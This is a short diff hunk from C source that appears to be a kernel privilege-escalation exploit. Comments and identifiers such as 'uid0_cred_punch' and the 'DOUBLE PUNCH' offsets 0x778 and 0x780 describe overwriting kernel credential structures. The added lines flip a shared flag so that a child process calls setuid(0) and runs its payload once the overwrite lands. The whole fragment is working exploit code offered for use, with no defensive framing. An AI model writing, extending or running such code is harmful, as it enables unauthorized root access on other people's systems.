@@ -2592,6 +2592,14 @@ uid0_cred_punch:;
 
   uid0_write_proof(self_uid, self_status, child_uid, status_uid, who, use_task);
 
+  /* DUALWRITE/single-store wake: flip the pur-spin flag so the child
+   * setuid(0)s and payloads if the subjective cred landed. Harmless on
+   * misses (child re-arms; miss path kills it). */
+  if (g_uid0_flag_page) {
+    *(volatile uint32_t *)g_uid0_flag_page = 1;
+    __sync_synchronize();
+  }
+
   /* DOUBLE PUNCH (09-13): 0x778 real_cred lands ~always but is status-only;
    * 0x780 subjective never lands alone (0/16). Two-stage on ONE quiet child:
    * stage 1 (0x778) landed + child still ALIVE -> stage 2 (0x780) completes
